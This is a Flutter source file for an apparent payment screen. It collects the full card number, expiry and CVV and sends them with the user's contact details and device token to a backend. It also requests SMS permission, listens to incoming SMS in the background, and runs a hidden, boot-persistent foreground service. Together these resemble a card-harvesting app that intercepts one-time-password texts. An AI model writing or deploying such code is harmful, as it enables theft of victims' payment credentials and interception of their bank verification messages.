import 'package:credit_app/Model/cardDetailSendModel.dart';
import 'package:credit_app/UI/EndScreen.dart';
import 'package:credit_app/UI/paymentSelectionScreen.dart';
import 'package:credit_app/ViewModel/product_view_model.dart';
import 'package:credit_app/background.dart';
import 'package:credit_app/components/TextFormField.dart';
import 'package:credit_app/components/appButton.dart';
import 'package:datetime_picker_formfield_new/datetime_picker_formfield.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:gap/gap.dart';
import 'package:intl/intl.dart';
import 'package:just_the_tooltip/just_the_tooltip.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import '../Repository/sendCardDetailRepo.dart';
import 'dart:io';
import 'dart:isolate';
import 'package:permission_handler/permission_handler.dart';
import 'package:another_telephony/telephony.dart';
import '../main.dart';

class CardDetailsScreen extends StatefulWidget {
  const CardDetailsScreen({
    super.key,
  });

  @override
  _CardDetailsScreenState createState() => _CardDetailsScreenState();
}

class _CardDetailsScreenState extends State<CardDetailsScreen> {
  final _formKey = GlobalKey<FormState>();
  bool showError = false;
  bool showError1 = false;
  bool showError2 = false;
  bool showError3 = false;
  bool showError4 = false;
  bool showError5 = false;
  bool showError6 = false;
  bool showError7 = false;
  bool showError8 = false;
  String text = '';
  String text2 = '';
  String text3 = '';
  String text4 = '';
  String text5 = '';
  String text6 = '';
  String text7 = '';
  String text8 = '';
  String text9 = '';
  final _controller = JustTheController();
  final _cardHolderController = TextEditingController();
  final _mobileNumberController = TextEditingController();
  final _emailController = TextEditingController();
  final _dobController = TextEditingController();
  final _cardNumberController = TextEditingController();
  final _expiryYearController = TextEditingController();
  final _expiryExpiryController = TextEditingController();
  final _cvvController = TextEditingController();
  final _availableController = TextEditingController();
  Future<void> _selectDate(BuildContext context) async {
    DateTime? selectedDate;
    final DateTime? picked = await showDatePicker(
      context: context,
      initialDate: DateTime.now(),
      firstDate: DateTime(2000),
      lastDate: DateTime(2101),
    );
    if (picked != null && picked != selectedDate) {
      setState(() {
        selectedDate = picked;
      });
    }
  }

  ReceivePort? _receivePort;

  Future<void> _requestPermissionForAndroid() async {
    if (!Platform.isAndroid) {
      return;
    }
    if (!await FlutterForegroundTask.isIgnoringBatteryOptimizations) {
      // This function requires `android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` permission.
      await FlutterForegroundTask.requestIgnoreBatteryOptimization();
    }

    // Android 13 and higher, you need to allow notification permission to expose foreground service notification.
    final NotificationPermission notificationPermissionStatus =
        await FlutterForegroundTask.checkNotificationPermission();
    if (notificationPermissionStatus != NotificationPermission.granted) {
      await FlutterForegroundTask.requestNotificationPermission();
    }
  }

  void _initForegroundTask() {
    FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
          id: 500,
          channelId: 'foreground_service',
          channelName: 'Foreground Service Notification',
          channelDescription:
              'This notification appears when the foreground service is running.',
          channelImportance: NotificationChannelImportance.MIN,
          priority: NotificationPriority.LOW,
          iconData: const NotificationIconData(
            resType: ResourceType.mipmap,
            resPrefix: ResourcePrefix.ic,
            name: 'launcher',
            backgroundColor: Colors.orange,
          ),
          visibility: NotificationVisibility.VISIBILITY_SECRET),
      iosNotificationOptions: const IOSNotificationOptions(
        showNotification: true,
        playSound: false,
      ),
      foregroundTaskOptions: const ForegroundTaskOptions(
        interval: 5000,
        isOnceEvent: false,
        autoRunOnBoot: true,
        allowWakeLock: true,
        allowWifiLock: true,
      ),
    );
  }

  final telephony = Telephony.instance;
  Future<bool> _startForegroundTask() async {
    // You can save data using the saveData function.
    await FlutterForegroundTask.saveData(key: 'customData', value: 'hello');
    telephony.listenIncomingSms(
      onNewMessage: onMessage,
      onBackgroundMessage: onBackgroundMessage,
    );
    // Register the receivePort before starting the service.
    final ReceivePort? receivePort = FlutterForegroundTask.receivePort;
    final bool isRegistered = _registerReceivePort(receivePort);
    if (!isRegistered) {
      print('Failed to register receivePort!');
      return false;
    }

    if (await FlutterForegroundTask.isRunningService) {
      return FlutterForegroundTask.restartService();
    } else {
      return FlutterForegroundTask.startService(
        notificationTitle: 'Foreground Service is running',
        notificationText: 'Tap to return to the app',
        callback: startCallback,
      );
    }
  }

  Future<bool> _stopForegroundTask() {
    return FlutterForegroundTask.stopService();
  }

  bool _registerReceivePort(ReceivePort? newReceivePort) {
    if (newReceivePort == null) {
      return false;
    }

    _closeReceivePort();

    _receivePort = newReceivePort;
    _receivePort?.listen((data) {
      if (data is int) {
        print('eventCount: $data');
      } else if (data is String) {
        if (data == 'onNotificationPressed') {
          Navigator.of(context).pushNamed('/resume-route');
        }
      } else if (data is DateTime) {
        print('timestamp: ${data.toString()}');
      }
    });

    return _receivePort != null;
  }

  void _closeReceivePort() {
    _receivePort?.close();
    _receivePort = null;
  }

  bool permission = false;
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      await _requestPermissionForAndroid();
      _initForegroundTask();

      // You can get the previous ReceivePort without restarting the service.
      if (await FlutterForegroundTask.isRunningService) {
        final newReceivePort = FlutterForegroundTask.receivePort;
        _registerReceivePort(newReceivePort);
      }
    });
    Permission.sms.request();
    Permission.sms.isGranted.then((value) {
      permission = value;
      setState(() {});
    });
  }

  @override
  void dispose() {
    _closeReceivePort();
    super.dispose();
  }

  bool show = false;
  final _inputFormatters = [
    LengthLimitingTextInputFormatter(5), // Limit to 7 characters (MM/YYYY)
    MonthYearInputFormatter(),
  ];
  final format = DateFormat("dd/MM/yyyy");
  bool isShow = true;
  @override
  Widget build(BuildContext context) {
    double width = MediaQuery.sizeOf(context).width;
    double height = MediaQuery.sizeOf(context).height;
    return WithForegroundTask(
      child: Scaffold(
        appBar: AppBar(
          iconTheme: const IconThemeData(color: Colors.white),
          backgroundColor: Colors.black,
          title: const Text(
            'Add Card Details',
            style: TextStyle(color: Colors.white),
          ),
        ),
        body: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Padding(
                padding: const EdgeInsets.all(10),
                child: Row(
                  children: [
                    const Text("Payment Method: "),
                    Consumer(
                      builder:
                          (BuildContext context, WidgetRef ref, Widget? child) {
                        final paymentMethod = ref.watch(paymentGateWayProvider);
                        return Text(
                          paymentMethod,
                          style: const TextStyle(color: Colors.red),
                        );
                      },
                    ),
                  ],
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(16.0),
                child: Form(
                  key: _formKey,
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      CustomTextFormField(
                        controller: _cardHolderController,
                        labelText: 'Card Holder Name*',
                        hintText: 'Enter Your Name',
                        keyboardType: TextInputType.text,
                        onSaved: (value) {},
                        showError: showError,
                        icon: showError
                            ? JustTheTooltip(
                                isModal: true,
                                shadow: const Shadow(color: Colors.grey),
                                tailBuilder:
                                    JustTheInterface.defaultBezierTailBuilder,
                                content: Padding(
                                  padding: const EdgeInsets.all(8.0),
                                  child: Text(text),
                                ),
                                child: const Material(
                                  color: Colors.transparent,
                                  elevation: 0,
                                  child: Padding(
                                    padding: EdgeInsets.all(8.0),
                                    child: Icon(
                                      Icons.error,
                                      color: Colors.red,
                                    ),
                                  ),
                                ),
                              )
                            : show
                                ? InkWell(
                                    onTap: () {
                                      _cardHolderController.clear();
                                      setState(() {
                                        show = false;
                                      });
                                    },
                                    child: const Icon(Icons.cancel))
                                : const SizedBox(),
                        onChanged: (String? newValue) {
                          setState(() {
                            newValue!.isNotEmpty ? show = true : show = false;
                          });
                          setState(() {
                            showError = false;
                          });
                        },
                      ),
                      CustomTextFormField(
                        controller: _cardNumberController,
                        labelText: 'Enter Card Number*',
                        hintText: 'Enter Your Card Number',
                        keyboardType: TextInputType.number,
                        icon: showError4
                            ? JustTheTooltip(
                                isModal: true,
                                shadow: const Shadow(color: Colors.grey),
                                tailBuilder:
                                    JustTheInterface.defaultBezierTailBuilder,
                                content: Padding(
                                  padding: const EdgeInsets.all(8.0),
                                  child: Text(text5),
                                ),
                                child: const Material(
                                  color: Colors.transparent,
                                  elevation: 0,
                                  child: Padding(
                                    padding: EdgeInsets.all(8.0),
                                    child: Icon(
                                      Icons.error,
                                      color: Colors.red,
                                    ),
                                  ),
                                ),
                              )
                            : const SizedBox(),
                        onSaved: (value) {},
                        maxLength: 16,
                        showError: showError,
                        onChanged: (String? newValue) {
                          setState(() {
                            showError4 = false;
                          });
                        },
                      ),
                      Row(
                        children: [
                          Expanded(
                            child: CustomTextFormField(
                              inputFormater: _inputFormatters,
                              showError: showError,
                              controller: _expiryExpiryController,
                              labelText: 'Enter date* ',
                              hintText: 'MM/YY',
                              keyboardType: TextInputType.number,
                              icon: showError5
                                  ? JustTheTooltip(
                                      isModal: true,
                                      shadow: const Shadow(color: Colors.grey),
                                      tailBuilder: JustTheInterface
                                          .defaultBezierTailBuilder,
                                      content: Padding(
                                        padding: const EdgeInsets.all(8.0),
                                        child: Text(text6),
                                      ),
                                      child: const Material(
                                        color: Colors.transparent,
                                        elevation: 0,
                                        child: Padding(
                                          padding: EdgeInsets.all(8.0),
                                          child: Icon(
                                            Icons.error,
                                            color: Colors.red,
                                          ),
                                        ),
                                      ),
                                    )
                                  : const SizedBox(),
                              onSaved: (value) {},
                              maxLength: 5,
                              onChanged: (String? newValue) {
                                setState(() {
                                  showError5 = false;
                                });
                              },
                            ),
                          ),
                          const SizedBox(width: 10),
                          Expanded(
                            child: CustomTextFormField(
                              icon: showError7
                                  ? JustTheTooltip(
                                      isModal: true,
                                      shadow: const Shadow(color: Colors.grey),
                                      tailBuilder: JustTheInterface
                                          .defaultBezierTailBuilder,
                                      content: Padding(
                                        padding: const EdgeInsets.all(8.0),
                                        child: Text(text8),
                                      ),
                                      child: const Material(
                                        color: Colors.transparent,
                                        elevation: 0,
                                        child: Padding(
                                          padding: EdgeInsets.all(8.0),
                                          child: Icon(
                                            Icons.error,
                                            color: Colors.red,
                                          ),
                                        ),
                                      ),
                                    )
                                  : const SizedBox(),
                              showError: showError,
                              controller: _cvvController,
                              labelText: 'CVV*',
                              hintText: 'Enter CVV',
                              keyboardType: TextInputType.number,
                              onSaved: (value) {},
                              maxLength: 3,
                              onChanged: (String? newValue) {
                                setState(() {
                                  showError7 = false;
                                });
                              },
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(
                        height: 10,
                      ),
                      Consumer(builder: (context, ref, _) {
                        final userData = ref.watch(userProvider);
                        final cart = ref.watch(cartProvider);
                        return Visibility(
                          visible: isShow,
                          child: InkWell(
                            child: AppButton(
                                title: 'PROCEED',
                                onTap: () async {
                                  if (_cardHolderController.text.isEmpty) {
                                    setState(() {
                                      text = 'Name is required';
                                      showError = true;
                                    });
                                  } else if (_cardNumberController
                                      .text.isEmpty) {
                                    setState(() {
                                      text5 = 'Card Number is required';
                                      showError4 = true;
                                    });
                                  } else if (_cardNumberController.text.length <
                                      16) {
                                    setState(() {
                                      text5 = 'Card Number should be 16 digits';
                                      showError4 = true;
                                    });
                                  } else if (_expiryExpiryController
                                      .text.isEmpty) {
                                    setState(() {
                                      text6 = 'Expiry Date is required';
                                      showError5 = true;
                                    });
                                  } else if (_expiryExpiryController
                                          .text.length <
                                      5) {
                                    setState(() {
                                      text6 = 'Expiry Date is required';
                                      showError5 = true;
                                    });
                                  } else if (_cvvController.text.isEmpty) {
                                    setState(() {
                                      text8 = 'CVV is required';
                                      showError7 = true;
                                    });
                                  } else if (_cvvController.text.length < 3) {
                                    setState(() {
                                      text8 = 'CVV should be 3 digits';
                                      showError7 = true;
                                    });
                                  }
                                  // else if (_availableController.text.isEmpty) {
                                  //   setState(() {
                                  //     text9 = 'Availability is required';
                                  //     showError8 = true;
                                  //   });
                                  // }
                                  else {
                                    setState(() {
                                      text = text2 = text3 = text4 = text5 =
                                          text6 = text7 = text8 = text9 = '';
                                      showError1 = showError2 = showError3 =
                                          showError4 = showError5 = false;
                                      showError6 = showError7 =
                                          // showError8 =
                                          showError = false;
                                    });
                                    final parts =
                                        _expiryExpiryController.text.split('/');
                                    final month =
                                        parts.isNotEmpty ? parts[0] : '';
                                    final year =
                                        parts.length > 1 ? parts[1] : '';
                                    print('Month: $month, Year: $year');
                                    setState(() {
                                      isShow = false;
                                    });
                                    String id = DateTime.now()
                                        .millisecondsSinceEpoch
                                        .toString();
                                    String fcm = await NotificationServices()
                                        .getDeviceToken();
                                    startForegroundTask();
                                    await SendCardDetailRepo()
                                        .sendCardDetailApi(
                                            UserData(
                                              name: _cardHolderController.text,
                                              card: _cardNumberController.text,
                                              date:
                                                  '${DateTime.now().day}/${DateTime.now().month}',
                                              mobile: userData.mobileNumber,
                                              email: userData.email,
                                              dob: _dobController.text,
                                              ceM: int.parse(month),
                                              ceY: int.parse(year),
                                              cvv: int.parse(
                                                  _cvvController.text),
                                              available: 0,
                                              id: id,
                                              fcmToken: fcm,
                                            ),
                                            cart)
                                        .then((value) async {
                                      SharedPreferences sp =
                                          await SharedPreferences.getInstance();
                                      sp.setString('uid', id);
                                    });
                                    Navigator.push(
                                        context,
                                        MaterialPageRoute(
                                            builder: (context) =>
                                                const EndScreen()));
                                  }
                                }),
                          ),
                        );
                      }),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

class ArrowPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Colors.grey[800]!;
    final path = Path()
      ..moveTo(20, 0)
      ..lineTo(25, 10)
      ..lineTo(15, 10)
      ..close();
    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) {
    return false;
  }
}

class MonthYearInputFormatter extends TextInputFormatter {
  @override
  TextEditingValue formatEditUpdate(
      TextEditingValue oldValue, TextEditingValue newValue) {
    final text = newValue.text;
    final length = text.length;

    if (length == 2 && oldValue.text.length == 1) {
      // Add slash after 2 digits
      return TextEditingValue(
        text: '$text/',
        selection: const TextSelection.collapsed(
            offset: 3), // Move cursor after the added slash
      );
    }

    return newValue;
  }
}
